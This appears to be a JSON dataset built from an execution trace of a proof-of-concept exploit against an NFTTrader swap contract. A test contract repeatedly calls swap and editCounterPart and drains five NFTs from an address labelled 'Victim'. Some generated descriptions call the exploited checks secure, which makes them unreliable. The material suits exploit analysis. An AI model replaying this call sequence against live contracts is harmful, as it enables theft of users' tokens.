        "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4) {\n",
        "description": "1. **Core functions**:  \nThis function is designed to handle the receipt of a specific type of digital asset (an ERC721 token) by a contract. It ensures that the contract is aware of and can properly manage the incoming token. This is often used in contracts that interact with NFTs (Non-Fungible Tokens) to confirm that the token has been successfully transferred and received.\n\n2. **Security mechanism**:  \nThe function is marked as `external`, meaning it can only be called from outside the contract, ensuring it is triggered only by external token transfers. It also returns a specific value (`bytes4`) that acts as a confirmation signal, ensuring the token transfer is valid and accepted by the contract. This helps prevent unauthorized or incorrect token transfers.\n\n3. **Parameter Function**:  \n- `operator`: The address of the entity (e.g., a user or another contract) that initiated the token transfer.  \n- `from`: The address of the previous owner of the token.  \n- `tokenId`: A unique identifier for the specific token being transferred.  \n- `data`: Additional information or instructions that might be sent along with the token transfer.  \n\n4. **Return description**:  \nThe function returns a fixed value (`bytes4`) that represents a specific code (`0x150b7a02`). This code is a standard signal used in ERC721 token transfers to confirm that the contract has successfully received the token and is ready to handle it.  \n\n**In summary**, this function ensures that a contract can properly receive and manage ERC721 tokens, using specific parameters to track the transfer details and returning a confirmation code to validate the process.",
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10348 [1.034e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": "    function editCounterPart(uint256 _swapId, address payable _counterPart) public {\n        require(msg.sender == swapList[msg.sender][swapMatch[_swapId]].addressOne, \"Message sender must be the swap creator\");\n        swapList[msg.sender][swapMatch[_swapId]].addressTwo = _counterPart;\n    }\n\n    // Set the payment\n",
        "description": "1. Core functions:  \nThis function allows the creator of a specific swap to update the counterpart address associated with that swap. It ensures that only the original creator of the swap can make this change, maintaining control over who can participate in the swap.\n\n2. Security mechanism:  \nThe function uses a `require` statement to check that the person calling the function (the `msg.sender`) is the same as the original creator of the swap. This prevents unauthorized users from modifying the counterpart address. Additionally, the function operates within the context of a structured data system (`swapList` and `swapMatch`), which helps organize and secure the swap details.\n\n3. Parameter Function:  \n- `_swapId`: This is a unique identifier for the swap. It helps the function locate the specific swap in the system.  \n- `_counterPart`: This is the new address that will be set as the counterpart in the swap. It must be a payable address, meaning it can receive funds.\n\n4. Return description:  \nThis function does not return any value. Instead, it directly updates the counterpart address (`addressTwo`) in the swap details stored in `swapList`. The update is performed only if the caller is verified as the swap creator.\n\nIn summary, this function allows the creator of a swap to update the counterpart address securely, ensuring only authorized changes are made.",
        "return_value": "Returned"
    },
    {
        "id": "83877",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6670, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], 6670, 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10348 [1.034e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "365963",
        "args": "swapIntent({ id: 0, addressOne: 0x0000000000000000000000000000000000000000, valueOne: 0, addressTwo: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, valueTwo: 0, swapStart: 0, swapEnd: 0, swapFee: 0, status: 0 }",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "[([0x20c004714deaf94f3e80538ac812eb372a6d40711070cd585f447f9ef76d525d, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0x00000000000000000000000000000000000000000000000000000000657ce880, 0x0000000000000000000000000000000000000000000000000000000000000000], 0x000000000000000000000000000000000000000000000000000000000000286d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0xC310e760778ECBca4C65B6C559874757A4c4Ece0)]"
    },
    {
        "id": "211973",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10349 [1.034e4]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "1497",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "78107",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10349 [1.034e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "63977",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6650, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], 6650, 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10349 [1.034e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "365963",
        "args": "swapIntent({ id: 0, addressOne: 0x0000000000000000000000000000000000000000, valueOne: 0, addressTwo: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, valueTwo: 0, swapStart: 0, swapEnd: 0, swapFee: 0, status: 0 }",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "[([0x20c004714deaf94f3e80538ac812eb372a6d40711070cd585f447f9ef76d525d, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0x00000000000000000000000000000000000000000000000000000000657ce880, 0x0000000000000000000000000000000000000000000000000000000000000000], 0x000000000000000000000000000000000000000000000000000000000000286e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0xC310e760778ECBca4C65B6C559874757A4c4Ece0)]"
    },
    {
        "id": "201679",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10350 [1.035e4]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "1497",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "78107",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10350 [1.035e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "53683",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4843, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], 4843, 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10350 [1.035e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "365963",
        "args": "swapIntent({ id: 0, addressOne: 0x0000000000000000000000000000000000000000, valueOne: 0, addressTwo: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, valueTwo: 0, swapStart: 0, swapEnd: 0, swapFee: 0, status: 0 }",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "[([0x20c004714deaf94f3e80538ac812eb372a6d40711070cd585f447f9ef76d525d, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0x00000000000000000000000000000000000000000000000000000000657ce880, 0x0000000000000000000000000000000000000000000000000000000000000000], 0x000000000000000000000000000000000000000000000000000000000000286f0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0xC310e760778ECBca4C65B6C559874757A4c4Ece0)]"
    },
    {
        "id": "191979",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10351 [1.035e4]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "1497",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "78107",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10351 [1.035e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "43983",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5432, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], 5432, 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10351 [1.035e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "365963",
        "args": "swapIntent({ id: 0, addressOne: 0x0000000000000000000000000000000000000000, valueOne: 0, addressTwo: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, valueTwo: 0, swapStart: 0, swapEnd: 0, swapFee: 0, status: 0 }",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "[([0x20c004714deaf94f3e80538ac812eb372a6d40711070cd585f447f9ef76d525d, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0x00000000000000000000000000000000000000000000000000000000657ce880, 0x0000000000000000000000000000000000000000000000000000000000000000], 0x00000000000000000000000000000000000000000000000000000000000028700000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0xC310e760778ECBca4C65B6C559874757A4c4Ece0)]"
    },
    {
        "id": "191979",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10352 [1.035e4]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "1497",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "78107",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10352 [1.035e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "43983",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9870, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], 9870, 0x",
        "original_code": null,
        "description": null,
        "return_value": "0x150b7a02"
    },
    {
        "id": "1727",
        "args": "10352 [1.035e4], Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "580",
        "args": "6670",
        "original_code": null,
        "description": null,
        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "580",
        "args": "6650",
        "original_code": null,
        "description": null,
        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "580",
        "args": "4843",
        "original_code": null,
        "description": null,
        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "580",
        "args": "5432",
        "original_code": null,
        "description": null,
        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "580",
        "args": "9870",
        "original_code": null,
        "description": null,
        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "678",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "678",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "5"
    }
]